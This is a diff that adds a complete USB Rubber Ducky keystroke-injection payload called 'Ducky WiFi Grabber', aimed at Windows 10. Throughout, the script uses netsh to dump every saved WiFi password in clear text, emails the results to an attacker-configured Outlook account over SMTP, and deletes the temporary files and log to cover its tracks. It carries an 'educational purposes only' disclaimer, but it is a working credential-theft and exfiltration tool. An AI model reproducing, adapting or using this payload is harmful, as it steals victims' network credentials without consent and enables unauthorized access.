@@ -1,0 +1,86 @@
+REM Title:         Ducky WiFi Grabber
+REM Description:   Steals wifi passwords and sends them to your outlook email
+REM Author:        Zero_Sploit
+REM Props:         Hak5 Team
+REM Version:       1.0
+REM Category:      Exfiltration
+REM Target:        Windows 10 (CMD + Powershell)
+REM Attackmodes:   HID
+REM Some editing on your part is needed such as outlook email & password
+REM This script is for educational purposes only please do not use this for malicious purposes
+REM Open Cmd
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+REM Get all SSID
+STRING cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt
+ENTER
+REM Create a filter.bat to get all the profile names
+STRING echo SETLOCAL EnableDelayedExpansion^
+ENTER
+ENTER
+STRING for /f "tokens=5*" %%i in (a.txt) do (^
+ENTER
+ENTER
+STRING set val=%%i %%j^
+ENTER
+ENTER
+STRING if "!val:~-1!" == " " set val=!val:~0,-1!^
+ENTER
+ENTER
+STRING echo !val!^>^>b.txt) > filter.bat
+ENTER
+REM Run filter.bat and save all profile names in b.txt
+STRING filter.bat
+DELAY 300
+ENTER
+REM --> Save all the LOOT in Log.txt and delete the other files
+STRING (for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
+DELAY 1000
+REM Mail Log.txt
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING del .\a.txt 
+ENTER
+STRING del .\b.txt 
+ENTER
+STRING del .\filter.bat
+ENTER
+REM Email The Log.txt file
+STRING $SMTPServer = 'smtp-mail.outlook.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL HERE', 'YOUR EMAIL PASSWORD HERE')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'YOUR EMAIL HERE'
+ENTER
+STRING $ReportEmail.To.Add('YOUR EAMIL HERE')
+ENTER
+STRING $ReportEmail.Subject = 'WiFi key grabber'
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+REM Delete Log.txt and exit
+DELAY 3000
+STRING del Log.txt
+DELAY 500
+STRING exit
+ENTER
